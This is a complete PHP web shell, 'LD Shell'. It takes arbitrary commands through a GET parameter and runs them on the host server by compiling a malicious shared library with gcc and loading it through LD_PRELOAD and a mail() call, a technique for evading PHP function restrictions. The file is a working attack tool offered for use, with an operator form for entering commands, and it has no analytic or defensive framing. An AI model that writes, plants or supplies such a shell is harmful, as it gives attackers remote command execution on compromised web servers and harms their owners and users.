<?php
error_reporting(0);

if (isset($_GET['c']) && !empty($_GET['c'])) {
    $cmd = $_GET['c'];
    $output = "";

    // LD_PRELOAD Bypass
    $lib = '/tmp/lib' . rand(10000, 99999) . '.so';
    
    $payload = '#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    unsetenv("LD_PRELOAD");
    system("'.$cmd.' 2>&1");
}';

    file_put_contents('/tmp/p.c', $payload);
    @shell_exec("gcc -shared -fPIC -o $lib /tmp/p.c 2>/dev/null");
    @unlink('/tmp/p.c');

    if (file_exists($lib)) {
        putenv("LD_PRELOAD=$lib");
        mail("a@b.c", "", "", "");
        @unlink($lib);
        
        // Try to read output from different ways
        $output = @file_get_contents('/tmp/.out') ?: "Command executed (check manually)";
    }

    echo "<pre style='background:#000;color:lime;padding:15px;'>";
    echo "Command: " . htmlspecialchars($cmd) . "\n\n";
    echo $output ?: "No visible output (background run ho gaya)";
    echo "</pre>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>LD Shell</title>
    <style>
        body{background:#0a0a0a;color:#0f0;font-family:Consolas;padding:20px;}
        input{width:80%;padding:15px;background:#111;border:1px solid #0f0;color:#0f0;font-size:17px;}
        button{padding:15px 30px;background:#111;border:1px solid #0f0;color:#0f0;}
    </style>
</head>
<body>
    <h2>LD_PRELOAD Shell</h2>
    <form method="GET">
        <input type="text" name="c" placeholder="id || whoami || ls -la || uname -a" autofocus>
        <button type="submit">Execute</button>
    </form>
</body>
</html>
